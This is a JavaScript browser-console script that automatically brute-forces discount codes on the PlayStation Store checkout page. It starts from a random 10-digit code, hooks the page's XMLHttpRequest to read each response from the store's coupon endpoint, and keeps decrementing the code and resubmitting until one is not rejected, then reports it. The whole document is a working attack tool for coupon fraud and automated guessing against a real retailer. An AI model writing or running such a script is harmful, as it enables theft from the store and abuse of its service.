// keep a window scoped object to terminate script once we find a valid coupon
var validCouponFound = false;
var pauseState = false;

function updateForm(increment = true) {
	// are we incrementing? If unspecified, then yes
	if(increment) {
		// decrement the coupon code by 1
		document.getElementById('discountCode').value = document.getElementById('discountCode').value - 1;
	}
	// is last applyCount task still running?
	if(!gInputGatekeeper._getTaskById('applyCoupon')) {
		// no, click the button
		document.forms[1].lastElementChild.click();
	} else {
		// yes, wait a second before clicking the button
		setTimeout(1000, function() {
			document.forms[1].lastElementChild.click();
		});
	}
}

// store handle to XHR request open
var oldOpen = XMLHttpRequest.prototype.open;

// and overwrite the prototype so we can listen
XMLHttpRequest.prototype.open = function() {
	// when a load event fires
	this.addEventListener("load", function(e) {
		// check that we don't already have a valid coupon
		if(!validCouponFound) {
			// is this the coupon XHR request?
			if(e.currentTarget.responseURL == 'https://store.playstation.com/kamaji/api/chihiro/00_09_000/user/checkout/cart/coupon') {
				// store response JSON object in var
				var response = JSON.parse(e.target.responseText);
				// check that we actually got something back
				if(typeof response != 'undefined') {
					// does it have a header?
					if(typeof response.header != 'undefined') {
						// does the header have a status_code?
						if(typeof response.header.status_code != 'undefined') {
							// 0x017e means coupon invalid, did we get that, that would mean valid coupon?
							if(response.header.status_code != 0x017e) {
								validCouponFound = true;
								// no, the coupon is valid, in theory, if this ever happened, put it in a var
								var validCoupon = document.getElementById('discountCode').value;
								// fire off an alert, that should get your attention
								alert('Valid Coupon: ' + validCoupon);
								// let's put it in the console too for easy copy/paste action
								console.log('Valid Coupon: ' + validCoupon);
								// we're done here, no need to update the form again!
								return false;
							}
						}
					}
				}
			}
			// one of the conditions wasn't met, let's update the form and try again, unless we're paused
			if(!pauseState) {
				updateForm();
			}
		}
	});
	// apply original XHR open
	oldOpen.apply(this, arguments);
}

// did the user enter their own coupon code to start?
if(document.getElementById('discountCode').value == '') {
	// no they did not, let's generate a random start for them between 1000000000 and 9999999999
	// this ensures that the starting coupon will always be 10 digits
	document.getElementById('discountCode').value = Math.floor(Math.random() * (9999999999 - 1000000000)) + 1000000000
}

// submit the first coupon
updateForm();